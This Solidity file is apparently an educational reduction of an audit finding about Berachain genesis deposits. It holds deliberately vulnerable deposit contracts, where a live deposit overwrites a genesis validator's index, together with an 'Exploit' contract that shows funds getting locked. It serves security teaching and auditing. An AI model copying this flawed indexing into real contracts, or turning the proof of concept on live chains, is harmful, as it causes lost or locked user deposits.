// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Berachain — genesis deposit indexes are overwritten (Cantina, January 2025)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: genesis already occupies deposit indexes 0..n-1, but
    DepositContract.depositCount starts at 0. EnqueueDeposits stores the new
    deposit at the event index, so the first post-genesis deposit replaces
    the genesis validator and is not a new index. The 1 ETH stays in the
    deposit contract with no withdrawal. */

contract EthToken {
    string public symbol = "ETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DepositStore {
    struct Deposit {
        bytes32 pubkey;
        uint256 amount;
        bool exists;
    }

    mapping(uint256 => Deposit) public deposits;
    uint256 public genesisCount;

    function seedGenesis(uint256 index, bytes32 pubkey, uint256 amount) external {
        deposits[index] = Deposit(pubkey, amount, true);
        genesisCount = index + 1;
    }

    function enqueue(uint256 index, bytes32 pubkey, uint256 amount) external {
        deposits[index] = Deposit(pubkey, amount, true); // @> VULN: index comes from depositCount, so a live deposit overwrites genesis
        // FIX: seed depositCount from genesisCount, or reject index < genesisCount
    }
}

contract DepositContract {
    EthToken public ethToken;
    DepositStore public store;
    uint256 public depositCount;

    constructor(EthToken ethToken_, DepositStore store_) {
        ethToken = ethToken_;
        store = store_;
    }

    function deposit(bytes32 pubkey, uint256 amount) external {
        ethToken.transferFrom(msg.sender, address(this), amount);
        store.enqueue(depositCount, pubkey, amount);
        depositCount += 1;
    }
}

contract Exploit {
    bytes32 public constant GENESIS = bytes32(uint256(0x8dc9));
    bytes32 public constant NEWKEY = bytes32(uint256(0x1122));
    EthToken public ethToken; // CREATE nonce 1
    DepositStore public store; // CREATE nonce 2
    DepositContract public vault; // CREATE nonce 3

    constructor() {
        ethToken = new EthToken();
        store = new DepositStore();
        vault = new DepositContract(ethToken, store);
        store.seedGenesis(0, GENESIS, 32 ether);
        ethToken.mint(address(this), 1 ether);
    }

    function run() external {
        ethToken.approve(address(vault), 1 ether);
        vault.deposit(NEWKEY, 1 ether);
        (bytes32 pubkey, uint256 amount, bool exists) = store.deposits(0);
        require(exists, "slot");
        require(pubkey == NEWKEY, "not overwritten");
        require(pubkey != GENESIS, "genesis remains");
        require(amount == 1 ether, "amount");
        require(vault.depositCount() == store.genesisCount(), "no new index");
        require(ethToken.balanceOf(address(vault)) == 1 ether, "eth not locked");
    }
}
